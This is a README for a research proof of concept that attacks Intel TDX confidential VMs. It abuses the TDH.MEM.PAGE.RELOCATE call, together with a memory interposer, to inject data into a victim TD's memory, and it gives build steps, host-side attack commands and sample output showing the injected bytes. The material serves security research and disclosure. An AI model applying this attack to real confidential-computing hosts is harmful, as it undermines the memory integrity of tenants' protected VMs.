# Exploiting TDH.MEM.PAGE.RELOCATE on TDX

This is a PoC for the ciphertext and plaintext injection attacks on a TDX VM. It assumes a cooperative
debug scenario where a victim and attacker are manually synchronized through a
CLI interface.

A demonstration video is available in [tdx-page-relocate.webm](tdx-page-relocate.webm).

The victim TD will:
* Initialize its buffer with all zeros.
* Initialize a second data buffer with all 0xaa
* Wait
* Print its buffer.

The attacker aims to modify the plaintext contents of the victim buffer by leveraging the `TDH.MEM.PAGE.RELOCATE` call.

## Build

Building this PoC, requires you to follow the README in `../patches` to apply the KVM patch to your kernel. You will need to recompile the whole kernel. The folder contains a README with more instructions.

Afterward, you can build the attack code with `make`.

This will build the following artifact
- `./build/binaries/ddrop-vm-victim`

## Use

1) Copy `ddrop-vm-victim` to the VM and run it with sudo. Let <VICTIM_GPA> be the gpa shown in the `Guest physical address: ...` line
2) On the host, choose an affected HPA, and run the following from the patched TDXplore: `sudo python ./initialize_location.py --gpa <VICTIM DATA GPA> --hpa <TARGET HPA>`
3) Then relocate the victim buffer using `sudo python ./drop_relocate.py --gpa <VICTIM GPA> --hpa <TARGET HPA>`
4) The Python script will wait right before calling `TDH.MEM.PAGE.RELOCATE`, enable the interposer and press enter.

If successful, the final value for the memory buffer displayed by `ddrop_vm_victim` should contain `0xaa` instead of all zeros. Note that not all lines will be affected due to subchannel interleaving. See below for expected output.


## Example output

If the attack was successful, certain cache lines within the victim buffer should contain `0xaa`. Note that not all cache lines are affected due to subchannel interleaving. 

### TDX Victim

```
$ sudo ./ddrop-vm-victim
Allocated memory buffer of 4096 bytes
 --> Guest virtual address:  0x732eedb01000
 --> Guest physical address: 0x7635f000

Buffer initialized to zero:
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Allocated data buffer of 4096 bytes, initialized with 0xaa
 --> Guest virtual address:  0x732eedb00000
 --> Guest physical address: 0x767b4000

Move pages, then press enter

Printing memory buffer
aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```
